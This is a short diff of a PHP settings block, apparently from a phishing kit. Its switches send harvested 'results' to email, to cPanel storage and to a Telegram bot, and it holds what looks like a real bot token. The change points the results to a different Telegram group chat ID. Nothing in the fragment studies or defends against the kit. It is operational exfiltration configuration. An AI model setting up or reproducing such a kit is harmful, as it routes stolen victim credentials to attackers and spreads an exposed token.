@@ -12,7 +12,7 @@ $Send_Log  = 1; // SEND RESULTS TO EMAIL
 $Save_Log  = 1; // SAVE RESULTS TO CPANEL
 $Tele_bot  = 1; //SENDS RESULTS TO TELEGRAM
 $bot_token = "5399100710:AAFiDF-vMLu62C9vNMdyCq5yQULalbX-jRE"; // BOT TOKEN
-$chat_id   = "5399100710"; // GROUP CHAT ID
+$chat_id   = "-1002440209591"; // GROUP CHAT ID
 
 ////////////////////////////////////////////////////////////////////////////////
 
